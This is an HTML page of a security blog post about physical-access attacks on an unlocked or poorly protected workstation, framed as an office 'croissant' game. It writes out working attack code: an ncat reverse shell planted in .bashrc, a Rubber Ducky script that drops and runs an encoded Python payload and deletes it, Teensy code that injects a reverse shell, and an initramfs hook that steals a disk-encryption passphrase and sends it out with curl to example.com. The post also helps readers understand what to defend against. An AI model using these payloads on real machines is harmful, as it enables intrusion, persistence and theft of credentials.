@@ -1,0 +1,373 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola" />
+  <title>French Croissant - or why you need to lock your computer | Swissky's Lab</title>
+  <meta property="og:site_name" content="Swissky&apos;s Lab" />
+  <meta property="og:title" content="French Croissant - or why you need to lock your computer" />
+  <meta name="description" content="Last year the first day of my internship I was given a computer and asked to install and secure it for two days. After that delay anyone can try to attack and compromise my machine, and if so I was we…" />
+  <meta property="og:description" content="Last year the first day of my internship I was given a computer and asked to install and secure it for two days. After that delay anyone can try to attack and compromise my machine, and if so I was welcome to buy some &quot;French Croissants&quot; to the team while the attacker explain his method to get acces…" />
+  <meta property="og:url" content="https://swisskyrepo.github.io/blog/frenchcroissant/" />
+  <link rel="canonical" href="https://swisskyrepo.github.io/blog/frenchcroissant/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2017-11-08T00:00:00+00:00" />
+  <meta property="og:image" content="https://swisskyrepo.github.io/images/cyber-croissant.png" />
+  <meta property="og:image:alt" content="French Croissant - or why you need to lock your computer" />
+  <meta property="og:image:width" content="1024" />
+  <meta property="og:image:height" content="768" />
+  <meta property="og:image:type" content="image/jpeg" />
+  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
+  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">
+
+<!-- HEAD END -->
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/projects"
+          >Projects</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/about"
+          >About</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">French Croissant - or why you need to lock your computer</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2017-11-08T00:00:00+00:00">2017-11-08</time><span
+        class="mx-1">&middot;</span><time
+    datetime="PT0H4M0S">4&nbsp;min</time>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://swisskyrepo.github.io/images/cyber-croissant.png"
+      alt="French Croissant - or why you need to lock your computer"
+      width="1024"
+      height="768"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#open-session">Open session</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#written-password">Written password</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#outdated-components">Outdated components</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#guest-account">Guest account</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#debug-components">Debug components</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#usb-live-iso">USB Live ISO</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#grub-root-access">Grub - Root access</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#usb-rubber-ducky-or-teensy">USB : Rubber Ducky or Teensy</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/frenchcroissant/#initramfs-backdoor-encrypted-hard-drive">Initramfs Backdoor - Encrypted Hard Drive</a>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><p>Last year the first day of my internship I was given a computer and asked to install and secure it for two days. After that delay anyone can try to attack and compromise my machine, and if so I was welcome to buy some "French Croissants" to the team while the attacker explain his method to get access into your computer the next morning.
+There are some techniques you need to be aware of when you're securing your machine, the list below is not exhaustive.</p>
+<span id="continue-reading"></span><h2 id="open-session">Open session</h2>
+<p>When your colleague leave their computer without locking their session, it's time to go on their laptop and interact with it. In this scenario you can :</p>
+<ul>
+<li>send an email to the team if he was logged into his mail account</li>
+</ul>
+<pre data-lang="plain" style="background-color:#2b303b;color:#c0c5ce;" class="language-plain "><code class="language-plain" data-lang="plain"><span>To: team@company.com
+</span><span>Subject: Croissant for all tomorrow
+</span></code></pre>
+<ul>
+<li>if he was using Linux, you may want to keep a simple backdoor in order to do a privilege escalation and become a root user, the easiest way to achieve is to backdoor the .bashrc with a reverse-shell</li>
+</ul>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">ncat</span><span> 192.168.1.2 4444</span><span style="color:#bf616a;"> -e</span><span> /bin/bash </span><span style="color:#d08770;">2</span><span>&gt; /dev/null &amp;
+</span></code></pre>
+<h2 id="written-password">Written password</h2>
+<p>Maybe the most unskilled scenario, sometimes the user will write some interesting informations onto a paper sheet or a post-it, and leave it on their desktop. You can just grab the credential.<br />
+![alt text]({{ site.baseurl }}/images/security-password-postit.jpg "Logo Title Text 1")</p>
+<h2 id="outdated-components">Outdated components</h2>
+<p>The computer has to be updated, if your colleague doesn't do the regular patches you might be able to take advantages of this. Commonly you can target the Operating system e.g:Windows XP with MS08-067, or the Browser (Chrome/Firefox etc)</p>
+<h2 id="guest-account">Guest account</h2>
+<p>Sometimes the guest account is enable and allows you to get further access into the machine.
+<a href="https://www.exploit-db.com/exploits/41923/">LightDM (Ubuntu 16.04/16.10) - Guest Account Local Privilege Escalation</a></p>
+<h2 id="debug-components">Debug components</h2>
+<p>Most of the times you can acces the debug application on the port 80 on the internal network if there is no filtering. Depending of the application you look for :</p>
+<ul>
+<li>Common vulnerabilites (OWASP top 10)</li>
+<li>Debug interface (Python Flask)</li>
+</ul>
+<h2 id="usb-live-iso">USB Live ISO</h2>
+<p>When there is no bios password, it's easy to compromise the computer by booting with a Live USB / Live CD and adding the backdoor.</p>
+<h2 id="grub-root-access">Grub - Root access</h2>
+<p>Even if there is a bios password you still need to secure your Grub (boot-manager), otherwise anyone can edit it in order to start a root shell.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">Press </span><span style="color:#b48ead;">[</span><span>SHIFT KEY</span><span style="color:#b48ead;">]</span><span> to get into grub2
+</span><span style="color:#bf616a;">Press </span><span style="color:#b48ead;">[</span><span>E</span><span style="color:#b48ead;">]</span><span> to edit the command line
+</span><span style="color:#bf616a;">Append</span><span> init=/bin/sh
+</span></code></pre>
+<h2 id="usb-rubber-ducky-or-teensy">USB : Rubber Ducky or Teensy</h2>
+<p>If you are willing to spend around 40$, you can buy a Rubber Ducky. This is a fake USB which will act as a keyboard and send any key to the plugged computer. The payload can be created within a notepad or online at https://ducktoolkit.com/.</p>
+<p>The full documentation is available at <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript</a></p>
+<p>The following script was generated by DuckToolkit and serve a directory via HTTP</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">DEFAULT_DELAY</span><span> 100
+</span><span style="color:#bf616a;">DELAY</span><span> 3000
+</span><span style="color:#bf616a;">CTRL-ALT</span><span> t
+</span><span style="color:#bf616a;">DELAY</span><span> 200
+</span><span style="color:#bf616a;">STRING</span><span>  printf &#39;</span><span style="color:#a3be8c;">\e[3;1;1t</span><span>&#39;
+</span><span style="color:#bf616a;">ENTER
+</span><span style="color:#bf616a;">STRING</span><span>  echo H4sIACBLCFoC/13OzwqDMAwG8HufIiDM9jAfYLD7joLei2hmC/1HGgXffh2dHpbTx0f4JdanSAwxC1tTPq7oN8c2UZwxZxtWIRZ8Qzq0YU5SPQSUibmbzWJJtq06i0Iwetmmg00McPcwFNHhaxz7AWlHAriVddEUUBskrDRtQU/OnfTf+a6vUfJEK/Lz94jqcilY1uvN16jipX0AB59ZiuMAAAA= | </span><span style="color:#bf616a;">base64 --decode </span><span>| </span><span style="color:#bf616a;">gzip -d </span><span>&gt; environ-34314.py
+</span><span style="color:#bf616a;">ENTER
+</span><span style="color:#bf616a;">STRING</span><span>  nohup python environ-34314.py &gt; /dev/null </span><span style="color:#d08770;">2</span><span>&gt;&amp;</span><span style="color:#d08770;">1 </span><span>&amp;
+</span><span style="color:#bf616a;">ENTER
+</span><span style="color:#bf616a;">STRING</span><span>  rm</span><span style="color:#bf616a;"> -rf</span><span> environ-34314.py
+</span><span style="color:#bf616a;">ENTER
+</span><span style="color:#bf616a;">STRING</span><span> exit
+</span><span style="color:#bf616a;">ENTER
+</span></code></pre>
+<p>Alternatively you can buy a Teensy board for 15$, it requires a little bit of configuration but it works as well
+First, you need to install the arduino IDE, the Teensyduino and the rules for the Teensy board.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">wget</span><span> https://raw.githubusercontent.com/apmorton/teensy-template/master/tools/49-teensy.rules
+</span><span style="color:#bf616a;">mv</span><span> 49-teensy.rules /etc/udev/rules.d/49-teensy.rules
+</span><span style="color:#bf616a;">wget</span><span> https://www.pjrc.com/teensy/td_140/TeensyduinoInstall.linux64 &amp;&amp; </span><span style="color:#bf616a;">chmod</span><span> +x ./TeensyduinoInstall.linux64 &amp;&amp;</span><span style="color:#bf616a;">./TeensyduinoInstall.linux64
+</span><span style="color:#bf616a;">wget</span><span> https://www.arduino.cc/download_handler.php
+</span><span style="color:#bf616a;">tar</span><span> xvf arduino-1.8.5-linux64.tar.xz
+</span></code></pre>
+<p>The following code press the keys [ALT]+[F2], then write "xterm", followed by an echo into the user's .bashrc</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">setup</span><span>() {
+</span><span>
+</span><span>  </span><span style="color:#bf616a;">delay</span><span>(</span><span style="color:#d08770;">100</span><span>);
+</span><span>  Keyboard.</span><span style="color:#bf616a;">set_modifier</span><span>(MODIFIERKEY_ALT);
+</span><span>  Keyboard.</span><span style="color:#bf616a;">set_key1</span><span>(KEY_F2);
+</span><span>  Keyboard.</span><span style="color:#bf616a;">send_now</span><span>();
+</span><span>  </span><span style="color:#bf616a;">delay</span><span>(</span><span style="color:#d08770;">100</span><span>);
+</span><span>
+</span><span>  Keyboard.</span><span style="color:#bf616a;">set_modifier</span><span>(</span><span style="color:#d08770;">0</span><span>);
+</span><span>  Keyboard.</span><span style="color:#bf616a;">set_key1</span><span>(</span><span style="color:#d08770;">0</span><span>);
+</span><span>  Keyboard.</span><span style="color:#bf616a;">send_now</span><span>();
+</span><span>  </span><span style="color:#bf616a;">delay</span><span>(</span><span style="color:#d08770;">100</span><span>);
+</span><span>
+</span><span>  Keyboard.</span><span style="color:#bf616a;">println</span><span>(&quot;</span><span style="color:#a3be8c;">xterm</span><span>&quot;);
+</span><span>  </span><span style="color:#bf616a;">delay</span><span>(</span><span style="color:#d08770;">100</span><span>);
+</span><span>
+</span><span>  Keyboard.</span><span style="color:#bf616a;">set_key1</span><span>(KEY_ENTER);
+</span><span>  Keyboard.</span><span style="color:#bf616a;">send_now</span><span>();
+</span><span>  </span><span style="color:#bf616a;">delay</span><span>(</span><span style="color:#d08770;">100</span><span>);
+</span><span>
+</span><span>  </span><span style="color:#65737e;">// Reverse-shell stored in the bashrc
+</span><span>  Keyboard.</span><span style="color:#bf616a;">println</span><span>(&quot;</span><span style="color:#a3be8c;"> echo &#39; ncat 192.168.1.XX 4242 -e /bin/bash 2&gt;/dev/null &amp; clear&#39; &gt;&gt; $HOME/.bashrc </span><span>&quot;);
+</span><span>  </span><span style="color:#bf616a;">delay</span><span>(</span><span style="color:#d08770;">100</span><span>);
+</span><span>
+</span><span>  </span><span style="color:#65737e;">// Now we clean our tracks
+</span><span>  Keyboard.</span><span style="color:#bf616a;">println</span><span>(&quot;</span><span style="color:#a3be8c;">exit</span><span>&quot;);
+</span><span>  </span><span style="color:#bf616a;">delay</span><span>(</span><span style="color:#d08770;">100</span><span>);
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">loop</span><span>() {
+</span><span>  </span><span style="color:#bf616a;">delay</span><span>(</span><span style="color:#d08770;">5000</span><span>);
+</span><span>}
+</span></code></pre>
+<p>NOTE: When programming the board press the "RESET" button to avoid the launch of the payload on your computer</p>
+<h2 id="initramfs-backdoor-encrypted-hard-drive">Initramfs Backdoor - Encrypted Hard Drive</h2>
+<p>When you're booting there is one partition that is not encrypted in order to start. It will ask for your password and then decrypt and mount the other partition. If you have and access to the hard drive it is possible to replace the Initramfs.img in order to get the password to decrypt the full hdd, you can also wait for the decryption and then inject what you want inside a file as root :)</p>
+<p>Mounting boot partition (not encrypted)</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">fdisk -l</span><span> /dev/sda
+</span><span style="color:#bf616a;">mkdir</span><span> /mnt/sda1
+</span><span style="color:#bf616a;">mount</span><span> /dev/sda1 /mnt/sda1
+</span></code></pre>
+<p>Extracting initramfs-linux</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">cp</span><span> /dev/sda1/initramfs-linux.img /tmp/initramfs-linux.img.gz
+</span><span style="color:#bf616a;">gunzip</span><span> initramfs-linux.img.gz
+</span><span style="color:#bf616a;">cpio -i </span><span>&lt; initramfs-linux.img
+</span></code></pre>
+<p>Adding the backdoor and packaging back to a .img</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">vim</span><span> /hooks/encrypt
+</span><span>
+</span><span style="color:#bf616a;">backdoor</span><span> line 78
+</span><span style="color:#96b5b4;">echo </span><span style="color:#bf616a;">-n </span><span>&quot;</span><span style="color:#a3be8c;">Enter passphrase for /dev/sda3: </span><span>&quot;
+</span><span style="color:#96b5b4;">read </span><span style="color:#bf616a;">-s</span><span> mypass
+</span><span style="color:#96b5b4;">echo </span><span style="color:#bf616a;">-n </span><span>$</span><span style="color:#bf616a;">mypass </span><span>| </span><span style="color:#bf616a;">cryptsetup</span><span> open</span><span style="color:#bf616a;"> --key-file</span><span> -</span><span style="color:#bf616a;"> --type</span><span> luks /dev/sda3 mymap
+</span><span style="color:#bf616a;">mkdir</span><span> myfolder
+</span><span style="color:#bf616a;">mount</span><span> /dev/mapper/mymap myfolder
+</span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">curl example.com/LUKS/</span><span>$</span><span style="color:#bf616a;">mypass</span><span style="color:#a3be8c;"> 2&gt; /dev/null</span><span>&quot; &gt;&gt; myfolder/home/user/.bashrc
+</span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">curl example.com/LUKS/</span><span>$</span><span style="color:#bf616a;">mypass</span><span style="color:#a3be8c;"> 2&gt; /dev/null</span><span>&quot; &gt;&gt; myfolder/home/root/.bashrc
+</span><span style="color:#bf616a;">umount</span><span> myfolder
+</span><span style="color:#bf616a;">rmdir</span><span> myfolder
+</span><span style="color:#bf616a;">cryptsetup</span><span> close mymap
+</span><span>
+</span><span>
+</span><span style="color:#bf616a;">find</span><span> . | </span><span style="color:#bf616a;">cpio -o -H</span><span> newc | </span><span style="color:#bf616a;">gzip </span><span>&gt; ../test.img  
+</span></code></pre>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/whidinjector/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>WHID Injector - Tips and Tricks</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/ecw-ctf/" accesskey="."
+    ><span>ECW CTF - Web Writeups</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  <!-- Share page -->
+<br>
+
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time> Swissky</a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
